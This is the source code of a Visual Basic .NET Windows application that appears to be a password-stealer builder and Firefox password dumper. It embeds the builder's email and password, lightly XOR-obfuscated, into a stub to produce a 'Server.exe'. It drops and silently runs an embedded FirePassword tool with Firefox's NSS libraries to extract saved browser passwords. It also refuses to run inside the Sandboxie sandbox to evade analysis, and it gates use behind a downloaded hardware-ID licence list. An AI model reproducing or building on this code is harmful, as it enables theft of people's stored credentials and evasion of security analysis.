Imports System.Management
Imports System.IO
Imports System.Text
Public Class Form1
    Dim key, lic, options1, options2, filein As String
    Dim path As String = System.IO.Path.GetTempPath

    Public Function GetHDSerial() As String
        Dim disk As New ManagementObject("Win32_LogicalDisk.DeviceID=""C:""")
        Dim diskPropertyA As PropertyData = _
        disk.Properties("VolumeSerialNumber")
        Return diskPropertyA.Value.ToString()
    End Function

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        End
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        If TextBox1.Text.Contains("@") = False Then
            MsgBox("You need to enter a valid Email address!")
            Exit Sub
        ElseIf TextBox2.Text = "" Then
            MsgBox("You need to enter a Password!")
            Exit Sub
        End If
        If File.Exists("server.exe") Then
            My.Computer.FileSystem.DeleteFile("server.exe")
        End If
        Const FileSplit = "(&&)"
        Dim Stub, txt1, txt2 As String
        txt1 = TextBox1.Text
        txt2 = TextBox2.Text

        Dim i As Short
        txt1 = ""
        Dim KeyChar As Integer
        KeyChar = Asc("/\")
        For i = 1 To Len(TextBox1.Text)
            txt1 &= Chr(KeyChar Xor Asc(Mid(TextBox1.Text, i, 1)))
        Next
        txt2 = ""
        KeyChar = Asc("/\")
        For i = 1 To Len(TextBox2.Text)
            txt2 &= Chr(KeyChar Xor Asc(Mid(TextBox2.Text, i, 1)))
        Next

        Dim bf As Byte() = My.Resources.stub
        Dim TheFIlePath As String = Application.StartupPath & "\stub.exe"
        Dim TempFile As System.IO.FileStream = IO.File.Create(TheFIlePath)
        TempFile.Write(bf, 0, bf.Length)
        TempFile.Close()


        FileOpen(1, Application.StartupPath & "\stub.exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
        Stub = Space(LOF(1))
        FileGet(1, Stub)
        FileClose(1)
        If System.IO.File.Exists(Application.StartupPath & "\Server.exe") Then
            System.IO.File.Delete(Application.StartupPath & "\Server.exe")
        End If
        FileOpen(1, Application.StartupPath & "\Server.exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        FilePut(1, Stub & FileSplit & txt1 & FileSplit & txt2)
        FileClose(1)
        System.IO.File.Delete(Application.StartupPath & ("\stub.exe"))
        MsgBox("Server.exe file created !")
    End Sub


    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        fb1.ShowDialog()

        TextBox3.Text = fb1.SelectedPath.ToString
        If TextBox3.Text.Contains(" ") = True Then
            MessageBox.Show("Path must not contain any spaces", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            TextBox3.Text = ""
        End If

    End Sub

    Private Sub fb1_HelpRequest(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles fb1.HelpRequest
        TextBox3.Text = fb1.SelectedPath.ToString
    End Sub

    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
      
        Dim AA As Byte() = My.Resources.FirePassword
        Dim TheFIlePath As String = Application.StartupPath & "\firepassword.exe"
        Dim TempFile As System.IO.FileStream = IO.File.Create(TheFIlePath)
        TempFile.Write(AA, 0, AA.Length)
        TempFile.Close()
        Dim BB As Byte() = My.Resources.nspr4
        Dim TheFIlePath1 As String = Application.StartupPath & "\nspr4.dll"
        Dim TempFile1 As System.IO.FileStream = IO.File.Create(TheFIlePath1)
        TempFile1.Write(BB, 0, BB.Length)
        TempFile1.Close()
        Dim CC As Byte() = My.Resources.nss3
        Dim TheFIlePath2 As String = Application.StartupPath & "\nss3.dll"
        Dim TempFile2 As System.IO.FileStream = IO.File.Create(TheFIlePath2)
        TempFile2.Write(CC, 0, CC.Length)
        TempFile2.Close()
        Dim DD As Byte() = My.Resources.plc4
        Dim TheFIlePath3 As String = Application.StartupPath & "\plc4.dll"
        Dim TempFile3 As System.IO.FileStream = IO.File.Create(TheFIlePath3)
        TempFile3.Write(DD, 0, DD.Length)
        TempFile3.Close()
        Dim EE As Byte() = My.Resources.plds4
        Dim TheFIlePath4 As String = Application.StartupPath & "\plds4.dll"
        Dim TempFile4 As System.IO.FileStream = IO.File.Create(TheFIlePath4)
        TempFile4.Write(EE, 0, EE.Length)
        TempFile4.Close()
        Dim FF As Byte() = My.Resources.softokn3
        Dim TheFIlePath5 As String = Application.StartupPath & "\softokn3.dll"
        Dim TempFile5 As System.IO.FileStream = IO.File.Create(TheFIlePath5)
        TempFile5.Write(FF, 0, FF.Length)
        TempFile5.Close()

        Call decrypt()

        System.IO.File.Delete(Application.StartupPath & "\firepassword.exe")
        System.IO.File.Delete(Application.StartupPath & "\nspr4.dll")
        System.IO.File.Delete(Application.StartupPath & "\nss3.dll")
        System.IO.File.Delete(Application.StartupPath & "\plc4.dll")
        System.IO.File.Delete(Application.StartupPath & "\plds4.dll")
        System.IO.File.Delete(Application.StartupPath & "\softokn3.dll")

    End Sub
    Public Sub decrypt()

        Dim Proc As Process = New Process
        options1 = TextBox3.Text
        If CheckBox1.Checked = True Then
            options2 = "-m" & " " & TextBox4.Text
        End If
        Proc.StartInfo.Arguments = (" " & options2 & " " & options1)
        Proc.StartInfo.FileName = "firepassword.exe"
        Proc.StartInfo.UseShellExecute = False
        Proc.StartInfo.RedirectStandardOutput = True
        Proc.StartInfo.CreateNoWindow = True
        Proc.Start()
        RichTextBox1.Text = Proc.StandardOutput.ReadToEnd
        Proc.WaitForExit()
    End Sub

    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
        Dim saveFile1 As New SaveFileDialog()
        saveFile1.DefaultExt = "*.Txt"
        saveFile1.Filter = "Txt Files|*.Txt"
        If (saveFile1.ShowDialog() = System.Windows.Forms.DialogResult.OK) _
            And (saveFile1.FileName.Length) > 0 Then
            RichTextBox1.SaveFile(saveFile1.FileName, RichTextBoxStreamType.PlainText)
        End If
    End Sub

    Public Function FindAndKillProcess(ByVal name As String) As Boolean
        For Each clsProcess As Process In Process.GetProcesses
            If clsProcess.ProcessName.ToLower.Contains("SbieC") Then
                MessageBox.Show("This program can not be run in a sandbox!" & vbNewLine & "Please restart the program without sandbox!", "SandBox Detected!", MessageBoxButtons.OK, MessageBoxIcon.Error)
                Me.Close()
                Return True
            End If
        Next
        Return False
    End Function

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        If Not FindAndKillProcess("SbieC") Then
        Else
        End If
        If My.Settings.active = True And My.Settings.HWID.Equals(GetHDSerial()) Then
            TabControl1.Enabled = True
            GroupBox3.Enabled = True
            Button6.Enabled = False
            Exit Sub
        Else : TabControl1.Enabled = False
        End If
    End Sub

    Private Sub Button6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button6.Click

        lic = GetHDSerial()
        If My.Settings.active = True And My.Settings.HWID.Equals(lic) Then
            TabControl1.Enabled = True
            GroupBox3.Enabled = True
            Button6.Enabled = False
            My.Settings.Save()
            Exit Sub
        Else : TabControl1.Enabled = False
            Button6.Enabled = True
        End If

        If System.IO.File.Exists(path & "\" & "lic.tmp") = True Then
            System.IO.File.Delete(path & "\" & "lic.tmp")
        End If

        My.Computer.Network.DownloadFile("http://481217.t35.com/ffpassunlock.txt", path & "\" & "lic.tmp")
        Dim FILE_NAME As String = path & "\" & "lic.tmp"
        Dim objReader As New System.IO.StreamReader(FILE_NAME)
        filein = objReader.ReadToEnd
        Dim kkv As String
        kkv = filein
        If System.IO.File.Exists(path & "\" & "lic.tmp") = True And kkv.Contains(lic) = True Then
            MsgBox("Unlocked!" & vbNewLine & "Enjoy!")
            My.Settings.active = True
            My.Settings.HWID = lic
            My.Settings.Save()
            TabControl1.Enabled = True
            Button6.Enabled = False
            objReader.Close()
            If System.IO.File.Exists(path & "\" & "lic.tmp") = True Then
                System.IO.File.Delete(path & "\" & "lic.tmp")
            End If
        Else
            My.Settings.active = False
            MsgBox("You do not have a license or your application has not been processed yet.")
            objReader.Close()
            If System.IO.File.Exists(path & "\" & "lic.tmp") = True Then
                System.IO.File.Delete(path & "\" & "lic.tmp")
            End If
            Me.Close()
        End If
    End Sub

    Private Sub LinkLabel1_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        System.Diagnostics.Process.Start("http://www.natespages.ucoz.com")
    End Sub

    Private Sub CheckBox1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = True Then
            TextBox4.Enabled = True
            GroupBox3.Enabled = True
        Else : TextBox4.Enabled = False
        End If
    End Sub

    Private Sub TextBox2_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextBox2.TextChanged
        AcceptButton = Button1

    End Sub
End Class
